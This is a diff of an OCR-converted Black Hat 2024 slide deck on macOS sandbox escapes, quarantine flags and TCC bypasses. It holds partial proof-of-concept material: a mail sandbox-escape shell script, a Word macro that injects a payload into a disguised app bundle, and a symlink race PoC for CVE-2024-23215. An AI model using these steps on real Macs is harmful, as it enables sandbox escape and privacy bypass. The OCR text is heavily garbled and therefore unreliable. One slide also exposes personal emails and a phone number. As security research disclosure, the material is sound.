@@ -8,18 +8,24 @@ year: 2024
 source_pdf: "Black Hat USA 2024 slides/Zhongquan Li & Qidan He_Unveiling Mac Security A Comprehensive Exploration of Sandboxing and AppData TCC.pdf"
 pages: 154
 sha256: "b56c168b76e6a25dfa5b8344ad2dae9a82cb8c4c8b982aeac4bdfeb9a1e0246a"
-text_chars: 60243
-ocr_pages: 39
+text_chars: 53009
+ocr_pages: 36
 has_ocr: true
+redacted_secrets: 0
+ocr_confidence: 87.3
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T21:41:49Z"
+converted_at: "2026-08-12T04:46:00Z"
 ---
 # Unveiling Mac Security A Comprehensive Exploration of Sandboxing and AppData TCC
 
 **Speakers:** Zhongquan Li, Qidan He  
 **Conference:** Black Hat USA 2024  
 **Source:** `Black Hat USA 2024 slides/Zhongquan Li & Qidan He_Unveiling Mac Security A Comprehensive Exploration of Sandboxing and AppData TCC.pdf` (154 pages)
+
 
 ## Slide 1
 
@@ -29,11 +35,11 @@ Zhongquan Li & Qidan He
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 black hat —
-USA 2024
 AUGUST 7-8, 2024
 BRIEFINGS
 Unveiling Mac Security:
@@ -122,14 +128,11 @@ Over 40 exploitable logic vulnerabilities have been discovered since July 2023
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
-SS
 REGISTER NOW
-black hat | AUGUST 3-8, 2024
 USA 2024 MAND Y BAY-/ LAS VIBES
 TRAININGS ~ BRIEFINGS ~ ARSENAL ~ FEATURES ~ SCHEDULE ~ BUSINESS HALL ~ SPONSORS ~
 All times are Pacific Time (GI ITC -7h)
@@ -181,12 +184,11 @@ Tracks: Platform Security, Application Security: Offense
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Q
-black hat
-USA 2024
 System Integrity Protection is a security technology designed to help prevent potentially malicious
 software from modifying protected files and folders on your Mac. System Integrity Protection restricts the
 root user account and limits the actions that the root user can perform on protected parts of the Mac
@@ -310,11 +312,10 @@ The simplest app structure :
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 The simplest app structure :
 sh-3.2$ ls -R hello.app
 Contents
@@ -374,18 +375,6 @@ Time Stamp UUID
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-bisek hat
-USA 2024
-sh-3.2$ xattr -l ./hello.app
-com.apple.quarantine: @0c3;6666e204; Safari; 91B57AC3—EB1D-48EC-9EA3-5B97080819EC
-a Sd
-Flags Modifier
-UUID
-```
-
 ## Slide 23
 
 # Quarantine Protection on macOS
@@ -394,18 +383,6 @@ Flags Modifier
 Time Stamp UUID
 
 #BHUSA @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-bisek hat
-USA 2024
-sh-3.2$ xattr -l ./hello.app
-com.apple.quarantine: @0c3;6666e204; Safari; 91B57AC3—EB1D-48EC-9EA3-5B97080819EC
-a Sd
-Flags Modifier
-UUID
-```
 
 ## Slide 24
 
@@ -424,16 +401,12 @@ its launch
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
-GIIT SS a © ©
-com.apple.metadata: kMDItemWhereFroms:
 macOS cannot verify that this app is free
 from malware.
-com.apple.quarantine: 0083; 6666e204; Safari; 91B57AC3-EB1D-48EC-9EA3-5B97080819EC
 sh-3.2$ unzip hello.zip
 Archive: hello.zip
 creating: hello.app/
@@ -536,12 +509,11 @@ Failed
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Q
-black hat
-USA 2024
 Data — 112x24
 sh-3.2$ pwd
 /Users/ gg /Library/Containers/gulucat.HelloMac/Data
@@ -551,7 +523,6 @@ sh-3.2$ xattr -1 hello.app
 sh-3.2$ xattr -1 hello.app/Contents/
 sh-3.2$ xattr -l1 hello.app/Contents/MacOS/
 sh-3.2$ xattr -l1 hello.app/Contents/MacOS/hello 0086
-com.apple.quarantine: 0086; 650a9916;HelloMac : °
 sh-3.2$
 sh-3.2$
 sh-3.2$ open ./hello.app
@@ -632,12 +603,11 @@ Validating My Hypothesis: From a Code Perspective <u>https://opensource.apple.co
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Q
-black hat
-USA 2024
 extract_kexts.sh
 #!/bin/
 if -z "$1" J; then
@@ -651,7 +621,6 @@ if ! -f "$input_kernelcache" J; then
 "Usage: $@ <input_kernelcache>"
 exit 1
 fi
-kernelcache="./out_kernelcache"
 im4p extract -i "$input_kernelcache" -o "$kernelcache
 -l "$kernelcache" |
 -v "Listing Images" |
@@ -681,25 +650,20 @@ sh-3.2$ file ./binaries/com.apple.security. quarantine
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 ¢ Asandboxed app is not allowed to modify files' Quarantine attribute
-LABEL_11:.
 = sandbox_check_vnode( , ALL, , OLL, "com.apple.quarantine");
 if ( (_DWORD) )
 {
 LABEL_13:
-= QOLL;
 goto LABEL_14;
 4) }
 95 LABEL_18:
 if ( a5 - 4097 >= OxFFFFFFFFFFFFFQO2LL )
 {
-= alias data fANOTILI Olt \ +
-Q0Q0A8EO _syscall_quarantine_setinfo_common:87 (FFFFFEQ00B313560)
 % cat /System/Library/Sandbox/Profiles/application.sb|grep com.apple.quarantine
 (deny file-write-xattr (xattr "com.apple.quarantine") (with no-1log)) )
 ```
@@ -722,11 +686,10 @@ _Final Quarantine Flag = Input_Flag | 0x80_
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 WebKit / Source / WebCore / PAL / pal / spi / mac / QuarantineSPI.h
 | Code | Blame 88 lines (74 loc) - 2.92 KB
 0081 : Download
@@ -737,7 +700,6 @@ WebKit / Source / WebCore / PAL / pal / spi / mac / QuarantineSPI.h
 42 QTN_FLAG_SANDBOX = 0x0002,
 0086 : Sandbox + Hard 43 QTN_FLAG_HARD = 0x0004,
 44 QTN_FLAG_USER_APPROVED = 0x0040,
-45 io
 46
 ```
 
@@ -753,48 +715,35 @@ WebKit / Source / WebCore / PAL / pal / spi / mac / QuarantineSPI.h
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 ( )
 {
-Mintelmac /tmp % xattr -w "com.apple.quarantine" "@@86; 00000000; safari;" hello.app/Contents/MacOS/hello Ber i
 Aintelmac /tmp % open ./hello.app i 4
 .¢ application cannot be opened for an unexpected reason, error=Error Domain=NSOSStatusErrorDomain Code=-1081@ "kLSUnknownErr: Un —int64 result i
 expected internal error" UserInfo={_LSFunction=_LSLaunchWithRunningboard, _LSLine=309@, NSUnderlyingError=0x600001942078 {Error Do sent. *¥ 7 f
 main=RBSRequestErrorDomain Code=5 "Launch failed." UserInfo={NSLocalizedFailureReason=Launch failed., NSUnderlyingError=0x60000194 t64- - ff
 213@ {Error Domain=NSPOSIXErrorDomain Code=1 "Operation not permitted" UserInfo={NSLocalizedDescription=Launchd job spawn failed}} int64 v0; //
-+3} in 00,
 const char *v12; //
 const char *v13; //
 const char *v14; //
 unsigned int v15; //
-memset(vi6, @, sizeof(v16));
 = quarantine_get_flags(a2, OLL, &v15, ) Fs
 02
 u = OL: Quarantin
-TE = Ox5SD- )
 /kernel (/System/Library/Extensions/Quarantine.kext/Contents/MacOS/Quarantine) return 4
 Subsystem: -- Category: <Missing Description> Details return 1LL;
-t
-45 Get 6) ==. 65)
 return OLL;
 exec of /private/tmp/hello.app/Contents/MacOS/hello denied since it was quarantined by safar and created without user consent, qtn-flags was @x@0000086 If (C & 4) !=0)
-{
 LABEL_15
-kl *)getpath(a2);
 = "created without user consent";
-os_log_ internal (
-&dword_FFFFFE@Q07934E16,
 0s LOG_TYPE_ERROR,
 f %s denied since
 $ quarantined by
 S was
 (con )
-v;
-kfree_data_addr( i
 return 1LL;
 ```
 
@@ -950,11 +899,10 @@ Apple Mail WeChat
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat | “a i
-USA 2024
 mail_sbx_exp.sh
 #!/bin/
 -rf ./hello.app
@@ -964,14 +912,10 @@ set theFileManager to current application's NSFileManager's defaultManager( )
 set theContainerURL to theFileManager's containerURLForSecurityApplicationGroupIdentifier: theAppGroup
 return theContainerURL as text" > hello.scpt
 hello.scpt
-—rf ./hello.app/x
-—-rf ./hello.app/.*
-—p hello. app/Contents/MacOS
 '#!/bin/sh' > hello
 ‘open -a Calculator' >> hello
 "touch /tmp/YOUHAVEBEENHACKED' >> hello
 777 hello
-hello hello. app/Contents/MacOS/hello
 ./hello. app)
 ```
 
@@ -1080,12 +1024,12 @@ Quarantine flag: 0082
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 @®@®@ macbook — -zsh — 80x24
 macbook@macbookdeMBP ~ % sw_vers;csrutil status; open /tmp) |
-r "7 ©} Appearance ’
 Accessibility
 CJ Control Center
 © siri & spotiight
@@ -1103,15 +1047,11 @@ Bluetooth >
 Coe
 Microphone >
 Camera >
-e Q@
 Homekit >
 Speech Recognition >
-=)
 Media & Apple Music >
 Files and Folders
-CG
 Full Disk Access
-Wee
 ```
 
 ## Slide 66
@@ -1232,11 +1172,10 @@ Macro.docm
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-piseichat 3
-USA 2024
 Function GetDocumentPath() As String
 End
 Sub
@@ -1269,8 +1208,6 @@ theFileManager to current application's NSFileManager's defaultManager()\nset th
 text \"" > hello.scpt;osascript hello.scpt;"
 " Change the quarantine flag of executable file from 0086 to 0082, then inject the payload into the executable file and modify its mode.
 step3 = "open -a \""Microsoft Word\"" .com.apple.containermanagerd.metadata.plist.app/Contents/Mac0S/.com.apple.containermanagerd.metadata.plist; (sleep 1; echo \""#!/bin/sh\nopen -a Calculator\ntouch /tmp/
-YOUHAVEBEENHACKED\ntouch ~/Desktop/YOUHAVEBEENHACKED\"" > .com.apple.containermanagerd.metadata.plist.app/Contents/MacOS/.com. apple. containermanagerd.metadata.plist;chmod 777
-. com. apple. containermanagerd.metadata.plist.app/Contents/MacO0S/.com.apple. containermanagerd.metadata.plist; open ./.com.apple.containermanagerd.metadata.plist.app) & /dev/null &"
 If docPath = "" Then
 scriptCode = "do shell script "" " & stepl1&" “ & step2&"" & steps &" """
 MacScript (scriptCode)
@@ -1319,24 +1256,21 @@ access with other processes
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Name A Date Modified
 copyFileFromClipboard.app { KB © iCloud Drive rf
 flag.txt y 4:2 5 bytes Plain iOS Files er ) Fo!
-e & helloworld Applications ester e
-188
->  powerlog y at e Trash ter ) Fol
+> powerlog y at e Trash ter ) Fol
 Music er F
 Podcasts er 6:03 ,
 Other Users r
 Photos er )
 Developer er
 Music Creation esterda Folde
-Mail ri
 Messages esterday, 16:0 aie
-JHee8
 Books r
 S) Videos ter ) Ide
 com.apple.StorageManagement.CloudStorageHelper
@@ -1371,17 +1305,6 @@ macOS 0-Day
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-bisek hat
-USA 2024
-bitcoin
-iOS 0-Day?
-macOS 0-Day
-renee
-```
-
 ## Slide 83
 
 # macOS 15 : iPhone Mirroring
@@ -1410,22 +1333,17 @@ Copy operations are mistakenly assumed to have user consent
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
-<Foundation/Foundation. h>
 #import <Cocoa/Cocoa.
 int main(int argc, char * argv[]) {
 @autoreleasepool {
 ("pwd; touch hello.txt; uch hello2.txt");
 *currentDirectoryPath = [[ ] currentDirectoryPath] ;
-«filePath = [currentDirectoryPath hello. txt");
 «pasteboard = [
-[pasteboard 3
 *fileURL = [ :filePath];
-[pasteboard :@[fileURL]];
 [ 15.0];
 *filePaths = [pasteboard
 for ( *fileURL in filePaths) {
@@ -1447,17 +1365,14 @@ sh-3.2$ ./compile2.sh
 sh-3.2$
 sh-3.2$
 sh-3.2$ ./main.app/Contents/MacOS/main
-/Users/sg@/ Library/Containers/com.example.copyFileFromClipboard2/Data
 2024-06-13 15:04:51.962 main[10145:809989] Copied file path: /Users/§§§@j/Library/Containers/com.example.copyFileFromClipboard2/Data/hello.txt
 2024-06-13 15:04:51.965 main[10145:809989] Replaced the content of the copied file. The copied file's quarantine file should be 0082
 sh-3.2$
 sh-3.2$ xattr -1 /Users/qQgg§/Library/Containers/com.example.copyFileFromClipboard2/Data/hello.txt
 com.apple.TextEncoding: utf-8;134217984
-com.apple.quarantine: 0082;666a9a13;main;
 sh-3.2$
 sh-3.2$
 sh-3.2$ xattr -1 /Users/@@§/Library/Containers/com.example.copyFileFromClipboard2/Data/hello2.txt
-com.apple.quarantine: 0086; 666a9a@e;main;
 sh-3.2$
 ```
 
@@ -1606,22 +1521,17 @@ Mark the file with some properties: _Mandatory Access Control List_
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 Documents % xattr -l ./flag.txt
-com.apple.lastuseddate#Ps:
 0000 RONGANOATESHOUTOOROONOOND THGEECCRIROONOONOONOO eee sh-3.2$ # Double-Click on flag.txt, then use TextEdit modify flag.txt's content
 sh-3.2$
 sh-3.2$ xattr -1 flag.txt
 com.apple.quarantine: 0086;65046658;HelloMac; com.apple.TextEncoding: utf—8; 134217984
 com.apple.lastuseddate#PS:
 com.apple.macl:
-Mark the file with some properties: 2030 08 G2 GB GO 2B QO OO OO OO 20 OO OO 20 00 00 OO... esses eee e eee
-com.apple.metadata: kMDLabel_rjy3kg6k5f2gxj5elxtmqln4ey:
-com.apple.quarantine: 0@82;665425b1;TextEdit;
 ```
 
 ## Slide 97
@@ -1630,11 +1540,10 @@ com.apple.quarantine: 0@82;665425b1;TextEdit;
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 CVE-2023-42850
 Apple has assigned CVE-2023-42850 to this issue. CVEs are unique IDs used
 to uniquely identify vulnerabilites. The following describes the impact and
@@ -1670,14 +1579,12 @@ Text Here
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 , M™@™, & Documents % cat flag.txt
 cat: flag.txt: Operation not permitted
-‘gi— “B® Documents % open -—a TextEdit ./flag.txt
 The document “flag.txt” could
 not be opened. You don’t have
 permission.
@@ -1714,13 +1621,11 @@ GuluBadFinder : CVE-2023-42850 The app can register supported file types in Info
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 The app can register supported file types in in this way:
-<key>CFBundleDocumentTypes</key>
 <array>
 <dict>
 <key>CFBundleTypeName</key>
@@ -1762,7 +1667,8 @@ Text Here
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 @ OpenVPN Connect.app
@@ -1774,14 +1680,12 @@ Photos.app
 @ Preview.app
 [2c] PyCharm.app
 @ QQapp
-@ QQRK.app
 # QtScrcpy.app
 @ QuickTime Player.app
 ** Raspberry Pi Imager.app
 @® Reminders.app
 Remix IDE.app
 ®@ Safari.app
-@ Shadawenrke¥-NG@ ann
 sh-3.2# sw_vers ; csrutil status| |
 Date Modified
 March 14, 2022 at 13:24
@@ -1804,12 +1708,10 @@ July 11, 2023 at 12:23
 Nawamhar 18-2010 at 19:57
 Size
 49 bytes
-641.8 MB
 4.4MB
 40.3 MB
 418 KB
 43.7 MB
-9.4 MB
 1.01 GB
 2.15 GB
 761.9 MB
@@ -1820,7 +1722,6 @@ Size
 20.2 MB
 274.5 MB
 13.3 MB
-2aamA
 Kind
 Alias
 Application
@@ -1842,52 +1743,22 @@ Application
 Annlicatian
 Q Search
 beijia554517@sohu.com 2022/11/24
-RL ah 2022 FERRE
-MEME A! | WMI!
-3150396792@189.cn = 2022/9/27
-SHTMAROUAR—, HMR! F
 EMD 8887! |
 +86 170 9311 2590 2022/7/29
-s (RBS) RAS KMCA FR
-(AAR, OO, BOM, ave,
 fanxiaolong_wj@126.com 2021/3/17
-teeeeoeoeooeoe
-Y OMEMA) BB.
 boriquachic81@yahoo.com 2021/2/9
-eee eoeooeoe
-LY (sumiee vw) wy
-christine.halling@msmc..... 2021/1/22
-YREMA x EE
-YRECKeRs BOOxnsY..
-® 86829 >@?
-o@ 4G
-0 9
 ® Privacy & Security
 Focus
 @
-@
-vel
 8
-S
-©
-o @ Acces
 8
 9
-)
-8
 8
 2
 To: christine.halling@msmc.edu
 iMessage
 Jan 22, 2021 at 20:34
-DRM A & ARRAN
-YREOReEE OOOnay
 App Fi: www.8508999.com
-VIP 28: www.302626.com (SB iX Sil EF Ait 5S 88 a as Bw He)
-* SEM RAE BAR qq B:2993721277 SR
-S DMMB 20%, BTU, HAS SERGIG HMR!
-CBAALKR, AREMUBAA SE
-SSKRY, BANE! &
 HomeKit
 Speech Recognition
 Media & Apple Music
@@ -1975,11 +1846,10 @@ WeType can access WeChat’s private container folder
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 WeType can access WeChat's private container folder
 <key>NSDataAccessSecurityPolicy</key>
 <dict>
@@ -2003,35 +1873,27 @@ WeType can access WeChat's private container folder
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Q
-black hat
-USA 2024
 1] IDA View-A x = P B x TE] Pseudocode-A x [O! Hex View-1 x [AJ Structureg
 void __cdecl -[ASBMutableContainer (Protection) _applyDefaultSameTeamExceptionToDescr iptor: ] (
 ASBMutableContainer *self,
 3 SEL a2,
 4 int a3)
-5 it ntaine
-; T/
-> TI
-> T/
 1 = -[ASBMutableContainer ownerCode] ( , "“ownerCode");
 = objc_retainAutoreleasedReturnValue(v4) ;
 = objc_msgSend_O(v5, "teamIdentifier");
 = objc_retainAutoreleasedReturnValue(v6) ;
-5 objc_release_@(v5);
 {
 -[ASBMutableContainer (Protection) _registerExceptionToContainerAtFileDescriptor: forAllAppsFromTeam: ] (
-' registerExceptionToContainerAtFileDescr ptor: forAllAppsFromTean —.
 (u t)a3,
 2 );
 -[ASBMutableContainer (Protection) _registerExceptionToContainerAtFileDescriptor: forAllInstallPackagesFromTeam: ] (
 ceptionToContainerAtFileDescriptor: forAllInstallPackagesFromTeam ~_—_
 }
-objc_release_0(v/7);
 ```
 
 ## Slide 113
@@ -2042,13 +1904,11 @@ Secinitd owns “ _com.apple.private.security.appcontainer-authority_ ”
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Q
-black hat
-USA 2024
-3
 Secinitd owns “
 ; = copyin( , & , Ox28uLL);
 Ll, if ( !(_DWORD)v4 )
@@ -2072,11 +1932,10 @@ Different MACL generation strategies based on the type
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 Different MACL generation strategies based on the type
 BULU LADCL Z,
 {
@@ -2101,14 +1960,11 @@ ARFI AS:
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 Different MACL generation strategies based on the type
-=] IDA View-A XT] Pseudocode-8 XS) Strings XOl Hex View-7 XAT Structures x
-__int64 _ fastcall macl_record_app_exception(__int64 al, _ int64 a2, _ int64 a3, __ int64 a4)
 {
 __int64 v7; // x0
 __int64 v8; // x19
@@ -2118,9 +1974,7 @@ v7 = macl_copy_for_vnode(al, 1LL);
 memset(v10, 0, 23);
 q macl_app_exception_identifier_for_signed_code(a4, a2, a3, v10);
 3 macl_add_entry(v8, 2LL, vi0, OLL, OLL, OLL);
-q macl_release(v8) ;
 » return OLL;
-> }
 sh-3.2$ xattr -l1 ~/Library/Containers/com.tencent.xinWeChat/Data
 com.apple.macl:
 ```
@@ -2133,28 +1987,21 @@ Different MACL generation strategies based on the type
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 Different MACL generation strategies based on the type
-eres
 int64 fastcall macl_record_team_exception(__int64 al, char *a2, char a3)
-orgs ee
-a
-__int64 v5; // x¢
-}  __int64 v6; // x20
+} __int64 v6; // x20
 _BYTE v7[23]; // [xsp+0 xbp-30 BYRE
 B return 45LL;
-Dt
 5 = macl_copy_for_vnode(ai, 1LL);
 } return 12LL;
 memset(v7, 0, sizeof(v7));
 b macl_team_exception_identifier(@, a2, (__int64)v7);
 macl_add_entry(v6, B, (__int128 *)v7, ®, 0, 0);
 macl_release(v6);
-b
 }
 ) return OLL;
 }
@@ -2170,11 +2017,10 @@ Different MACL generation strategies based on the type
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 Different MACL generation strategies based on the type
 __int64 _ fastcall macl_record_package _exception(__int64 al, __int64 a2, char a3)
 __int64 v5; // x0
@@ -2187,7 +2033,6 @@ return 12LL;
 memset(v7, 0, 23);
 macl_package_exception_identifier(a2, v7);
 macl_add_entry(v6, 4LL, v7, OLL, OLL, OLL);
-macl_release(v6) ;
 return OLL;
 }
 sh-3.2$ xattr -1 gulucat.HelloMac/Data/
@@ -2224,11 +2069,10 @@ MACL can bypass all file TCC limitations
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 CVE-2023-42932
 Apple has assigned CVE-2023-42932 to this issue. CVEs are unique IDs used
 to uniquely identify vulnerabilites. The following describes the impact and
@@ -2254,22 +2098,18 @@ Secinitd will still update the destination folder’s MACL attribute with the la
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 objc_release( );
 objc_release( Ds
 ll ( )objc_msgSend( > sDirectory") && !( )objc_msgSend( 7 ym k") )
-objc_release( iH
 objc_release( );
 goto LABEL_13;
 }
 = ( )j__container_log_handle_for_category(1LL) ;
-= j__objc_retainAutoreleasedReturnValue_22( ):
 if ( !j__os_log_type_enabled_66( , OS_LOG_TYPE_ERROR) )
-goto LABEL _40;
 = 138412546;
 = 2112!
 = y a ea eri subdirectory doesn't target expectation cachetntry a node @
@@ -2277,7 +2117,6 @@ goto LABEL _40;
 else
 {
 = ( )j__container_log_handle_for_category(1LL);
-= j__objc_retainAutoreleasedReturnValue_22( );
 if ( 1j__0s_log_type_enabled_66( , OS_LOG_TYPE_ERROR) )
 {
 ABEL_40:
@@ -2287,10 +2126,8 @@ goto LABEL_23;
 = 138412546;
 = 2112!
 }
-j___os_log_error_imp1_45(&dword_7FFBOD9FBO00, , OS_LOG_TYPE_ERROR, oa )& , Ox16u);
 goto LABEL_40;
 }
-ARFI 12:
 ```
 
 ## Slide 123
@@ -2299,11 +2136,10 @@ ARFI 12:
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 CVE-2024-23215
 Apple has assigned CVE-2024-23215 to this issue. CVEs are unique IDs used
 to uniquely identify vulnerabilites. The following describes the impact and
@@ -2353,18 +2189,16 @@ After creation, rename the folder to _~/Library/Containers/{bundle_id}_
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 black hat
-USA 2024
 GuluBadContainerManager2
 CVE-2024-23215 PoC
 main(int argc,
 @autoreleasepool {
-«homeDirectory
 “watchDirectory = [homeDirectory ary/Staging"]
-*linkTarget = [homeDirectory :@"Library/Safari"];
 *LinkName = @"Data";
 fileManager
 if (1 [fileManager watchDirectory]) {
@@ -2374,11 +2208,8 @@ return 1;
 Create a dispatch unning the open command asynchronously
 dispatch_queue_t queue (DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
 )(2 * NSEC_PER_SEC)), queue, “{
-containermanager2");
 / Keep track of existing directories to identify ne
 existingDirs = [fileManager
-xexistingDirsSet = [ rexistingDirs] ;
-ones
 :watchDirectory
 while ( ») x8
 @autoreleasepool {
@@ -2389,19 +2220,14 @@ newDirsSet = [ :currentDirsSet]
 :watchDirectory
 for ( *newDir in newDirsSet) {
 *newDirPath = [watchDirectory
-IL isDir;
 ([fileManager :newDirPath
 [newDirPath
-:newDir] ;
 or symlink if it
 if ([fileManager dataPath]) {
 [fileManager :dataPath
 Attempt to create a symlink, handling a race condition
 error
-(! [fileManager :dataPath
-:linkTarget :Serror]) {
 If a race condition occur
-, e symlink
 [fileManager :dataPath
 [fileManager :LinkTarget
 symlink af r ndition: %@ -> %@", dataPath, LinkTarget);
